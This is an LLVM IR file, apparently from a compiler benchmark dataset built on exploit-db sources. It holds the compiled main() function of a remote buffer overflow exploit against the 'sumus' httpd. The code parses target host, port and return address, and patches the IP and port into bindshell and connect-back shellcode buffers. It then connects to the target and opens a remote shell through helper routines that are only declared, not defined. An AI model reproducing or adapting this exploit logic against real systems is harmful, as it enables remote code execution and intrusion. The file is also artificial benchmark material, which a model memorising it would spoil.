; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_940.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_940.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32, i32, i8*, i32 }
%struct.hostent = type { i64 }

@.str = private unnamed_addr constant [114 x i8] c"[*] sumus[v0.2.2]: (httpd) remote buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\0A\0A\00", align 1
@DFL_PORT = common dso_local global i32 0, align 4
@tbl = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@DFL_SPORT = common dso_local global i32 0, align 4
@DFL_RETADDR = common dso_local global i32 0, align 4
@DFL_LOCT_KK = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [15 x i8] c"h:p:s:c:r:l:n:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"invalid host/ip. (-c option)\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@x86_bind = common dso_local global i32* null, align 8
@x86_ptr = common dso_local global i32* null, align 8
@x86_conn = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [79 x i8] c"ip(-c option) and/or port(-s option) appear to contain a null-byte, try again.\00", align 1
@DFL_JUMP_KK = common dso_local global i8 0, align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"ip(-l/-n option) made the overwritten \22kk\22 integer a null-byte.\00", align 1
@.str.7 = private unnamed_addr constant [22 x i8] c"[*] target\09\09\09: %s:%d\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"[*] shellcode type\09\09: %s(port=%d)\0A\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"connect-back\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"bindshell\00", align 1
@.str.11 = private unnamed_addr constant [35 x i8] c"[*] return address($eip)\09: 0x%.8x\0A\00", align 1
@.str.12 = private unnamed_addr constant [45 x i8] c"[*] overwritten \22kk\22 int value\09: %u(0x%.2x)\0A\00", align 1
@.str.13 = private unnamed_addr constant [41 x i8] c"[*] overflow size\09\09: %u(tot=%u) byte(s)\0A\00", align 1
@.str.14 = private unnamed_addr constant [30 x i8] c"[*] egg size\09\09\09: %u byte(s)\0A\0A\00", align 1
@EGGSIZE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8 0, i8* %6, align 1
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([114 x i8], [114 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* @DFL_PORT, align 4
  store i32 %13, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %14 = load i32, i32* @DFL_SPORT, align 4
  store i32 %14, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %15 = load i32, i32* @DFL_RETADDR, align 4
  store i32 %15, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %16 = load i8*, i8** @DFL_LOCT_KK, align 8
  %17 = ptrtoint i8* %16 to i32
  store i32 %17, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  br label %18

18:                                               ; preds = %87, %2
  %19 = load i32, i32* %4, align 4
  %20 = load i8**, i8*** %5, align 8
  %21 = call i32 @getopt(i32 %19, i8** %20, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  store i32 %21, i32* %7, align 4
  %22 = load i32, i32* @EOF, align 4
  %23 = icmp ne i32 %21, %22
  br i1 %23, label %24, label %88

24:                                               ; preds = %18
  %25 = load i32, i32* %7, align 4
  switch i32 %25, label %82 [
    i32 104, label %26
    i32 112, label %37
    i32 115, label %41
    i32 99, label %45
    i32 114, label %71
    i32 108, label %74
    i32 110, label %78
  ]

26:                                               ; preds = %24
  %27 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %28 = icmp ne i8* %27, null
  br i1 %28, label %36, label %29

29:                                               ; preds = %26
  %30 = load i32, i32* @optarg, align 4
  %31 = call i64 @strdup(i32 %30)
  %32 = inttoptr i64 %31 to i8*
  store i8* %32, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %33 = icmp ne i8* %32, null
  br i1 %33, label %36, label %34

34:                                               ; preds = %29
  %35 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %36

36:                                               ; preds = %34, %29, %26
  br label %87

37:                                               ; preds = %24
  %38 = load i32, i32* @optarg, align 4
  %39 = call i8* @atoi(i32 %38)
  %40 = ptrtoint i8* %39 to i32
  store i32 %40, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  br label %87

41:                                               ; preds = %24
  %42 = load i32, i32* @optarg, align 4
  %43 = call i8* @atoi(i32 %42)
  %44 = ptrtoint i8* %43 to i32
  store i32 %44, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  br label %87

45:                                               ; preds = %24
  %46 = load i32, i32* @optarg, align 4
  %47 = call i32 @inet_addr(i32 %46)
  store i32 %47, i32* %11, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %70

49:                                               ; preds = %45
  %50 = load i32, i32* @optarg, align 4
  %51 = call %struct.hostent* @gethostbyname(i32 %50)
  store %struct.hostent* %51, %struct.hostent** %10, align 8
  %52 = icmp ne %struct.hostent* %51, null
  br i1 %52, label %53, label %60

53:                                               ; preds = %49
  %54 = bitcast i32* %11 to i8*
  %55 = load %struct.hostent*, %struct.hostent** %10, align 8
  %56 = getelementptr inbounds %struct.hostent, %struct.hostent* %55, i32 0, i32 0
  %57 = load i64, i64* %56, align 8
  %58 = inttoptr i64 %57 to i8*
  %59 = call i32 @memcpy(i8* %54, i8* %58, i32 4)
  br label %60

60:                                               ; preds = %53, %49
  %61 = load i32, i32* %11, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %64

63:                                               ; preds = %60
  store i32 0, i32* %11, align 4
  br label %64

64:                                               ; preds = %63, %60
  %65 = load i32, i32* %11, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %69, label %67

67:                                               ; preds = %64
  %68 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 0)
  br label %69

69:                                               ; preds = %67, %64
  br label %70

70:                                               ; preds = %69, %45
  br label %87

71:                                               ; preds = %24
  %72 = load i32, i32* @optarg, align 4
  %73 = call i32 @sscanf(i32 %72, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2))
  br label %87

74:                                               ; preds = %24
  %75 = load i32, i32* @optarg, align 4
  %76 = call i8* @atoi(i32 %75)
  %77 = ptrtoint i8* %76 to i32
  store i32 %77, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  br label %87

78:                                               ; preds = %24
  %79 = load i32, i32* @optarg, align 4
  %80 = call i8* @atoi(i32 %79)
  %81 = ptrtoint i8* %80 to i8
  store i8 %81, i8* %6, align 1
  br label %87

82:                                               ; preds = %24
  %83 = load i8**, i8*** %5, align 8
  %84 = getelementptr inbounds i8*, i8** %83, i64 0
  %85 = load i8*, i8** %84, align 8
  %86 = call i32 @usage(i8* %85)
  br label %87

87:                                               ; preds = %82, %78, %74, %71, %70, %41, %37, %36
  br label %18

88:                                               ; preds = %18
  %89 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %90 = icmp ne i8* %89, null
  br i1 %90, label %96, label %91

91:                                               ; preds = %88
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 0
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @usage(i8* %94)
  br label %96

96:                                               ; preds = %91, %88
  %97 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  %98 = icmp slt i32 %97, 0
  br i1 %98, label %103, label %99

99:                                               ; preds = %96
  %100 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  %101 = load i32, i32* @BUFSIZE, align 4
  %102 = icmp sgt i32 %100, %101
  br i1 %102, label %103, label %106

103:                                              ; preds = %99, %96
  %104 = load i8*, i8** @DFL_LOCT_KK, align 8
  %105 = ptrtoint i8* %104 to i32
  store i32 %105, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  br label %106

106:                                              ; preds = %103, %99
  %107 = load i32, i32* %11, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %122, label %109

109:                                              ; preds = %106
  %110 = load i32*, i32** @x86_bind, align 8
  %111 = call i32 @strlen(i32* %110)
  store i32 %111, i32* %9, align 4
  %112 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %113 = and i32 %112, 65280
  %114 = ashr i32 %113, 8
  %115 = load i32*, i32** @x86_bind, align 8
  %116 = getelementptr inbounds i32, i32* %115, i64 20
  store i32 %114, i32* %116, align 4
  %117 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %118 = and i32 %117, 255
  %119 = load i32*, i32** @x86_bind, align 8
  %120 = getelementptr inbounds i32, i32* %119, i64 21
  store i32 %118, i32* %120, align 4
  %121 = load i32*, i32** @x86_bind, align 8
  store i32* %121, i32** @x86_ptr, align 8
  br label %154

122:                                              ; preds = %106
  %123 = load i32*, i32** @x86_conn, align 8
  %124 = call i32 @strlen(i32* %123)
  store i32 %124, i32* %9, align 4
  %125 = load i32, i32* %11, align 4
  %126 = and i32 %125, 255
  %127 = load i32*, i32** @x86_conn, align 8
  %128 = getelementptr inbounds i32, i32* %127, i64 33
  store i32 %126, i32* %128, align 4
  %129 = load i32, i32* %11, align 4
  %130 = and i32 %129, 65280
  %131 = ashr i32 %130, 8
  %132 = load i32*, i32** @x86_conn, align 8
  %133 = getelementptr inbounds i32, i32* %132, i64 34
  store i32 %131, i32* %133, align 4
  %134 = load i32, i32* %11, align 4
  %135 = and i32 %134, 16711680
  %136 = ashr i32 %135, 16
  %137 = load i32*, i32** @x86_conn, align 8
  %138 = getelementptr inbounds i32, i32* %137, i64 35
  store i32 %136, i32* %138, align 4
  %139 = load i32, i32* %11, align 4
  %140 = and i32 %139, -16777216
  %141 = lshr i32 %140, 24
  %142 = load i32*, i32** @x86_conn, align 8
  %143 = getelementptr inbounds i32, i32* %142, i64 36
  store i32 %141, i32* %143, align 4
  %144 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %145 = and i32 %144, 65280
  %146 = ashr i32 %145, 8
  %147 = load i32*, i32** @x86_conn, align 8
  %148 = getelementptr inbounds i32, i32* %147, i64 39
  store i32 %146, i32* %148, align 4
  %149 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %150 = and i32 %149, 255
  %151 = load i32*, i32** @x86_conn, align 8
  %152 = getelementptr inbounds i32, i32* %151, i64 40
  store i32 %150, i32* %152, align 4
  %153 = load i32*, i32** @x86_conn, align 8
  store i32* %153, i32** @x86_ptr, align 8
  br label %154

154:                                              ; preds = %122, %109
  %155 = load i32, i32* %9, align 4
  %156 = load i32*, i32** @x86_ptr, align 8
  %157 = call i32 @strlen(i32* %156)
  %158 = icmp ne i32 %155, %157
  br i1 %158, label %159, label %161

159:                                              ; preds = %154
  %160 = call i32 @printe(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.5, i64 0, i64 0), i32 1)
  br label %161

161:                                              ; preds = %159, %154
  %162 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  %163 = load i8, i8* %6, align 1
  %164 = zext i8 %163 to i32
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %166, label %169

166:                                              ; preds = %161
  %167 = load i8, i8* %6, align 1
  %168 = zext i8 %167 to i32
  br label %172

169:                                              ; preds = %161
  %170 = load i8, i8* @DFL_JUMP_KK, align 1
  %171 = zext i8 %170 to i32
  br label %172

172:                                              ; preds = %169, %166
  %173 = phi i32 [ %168, %166 ], [ %171, %169 ]
  %174 = add nsw i32 %162, %173
  store i32 %174, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 5), align 8
  %175 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 5), align 8
  %176 = icmp ne i32 %175, 0
  br i1 %176, label %179, label %177

177:                                              ; preds = %172
  %178 = call i32 @printe(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i64 0, i64 0), i32 1)
  br label %179

179:                                              ; preds = %177, %172
  %180 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %181 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0), i8* %180, i32 %181)
  %183 = load i32, i32* %11, align 4
  %184 = icmp ne i32 %183, 0
  %185 = zext i1 %184 to i64
  %186 = select i1 %184, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0)
  %187 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %188 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0), i8* %186, i32 %187)
  %189 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %190 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.11, i64 0, i64 0), i32 %189)
  %191 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 5), align 8
  %192 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 5), align 8
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.12, i64 0, i64 0), i32 %191, i32 %192)
  %194 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 4
  %195 = load i32, i32* @BUFSIZE, align 4
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.13, i64 0, i64 0), i32 %194, i32 %195)
  %197 = load i32, i32* @EGGSIZE, align 4
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.14, i64 0, i64 0), i32 %197)
  %199 = load i32, i32* %11, align 4
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %201, label %209

201:                                              ; preds = %179
  %202 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %203 = call i32 @getshell_bind_init(i32 %202)
  store i32 %203, i32* %8, align 4
  %204 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %205 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %206 = call i32 @sumus_connect(i8* %204, i32 %205)
  %207 = load i32, i32* %8, align 4
  %208 = call i32 @getshell_bind_accept(i32 %207)
  store i32 %208, i32* %8, align 4
  br label %216

209:                                              ; preds = %179
  %210 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %211 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %212 = call i32 @sumus_connect(i8* %210, i32 %211)
  %213 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %214 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %215 = call i32 @getshell_conn(i8* %213, i32 %214)
  store i32 %215, i32* %8, align 4
  br label %216

216:                                              ; preds = %209, %201
  %217 = load i32, i32* %8, align 4
  %218 = icmp sgt i32 %217, 0
  br i1 %218, label %219, label %222

219:                                              ; preds = %216
  %220 = load i32, i32* %8, align 4
  %221 = call i32 @proc_shell(i32 %220)
  br label %222

222:                                              ; preds = %219, %216
  %223 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strdup(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sscanf(i32, i8*, i32*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @getshell_bind_init(i32) #1

declare dso_local i32 @sumus_connect(i8*, i32) #1

declare dso_local i32 @getshell_bind_accept(i32) #1

declare dso_local i32 @getshell_conn(i8*, i32) #1

declare dso_local i32 @proc_shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
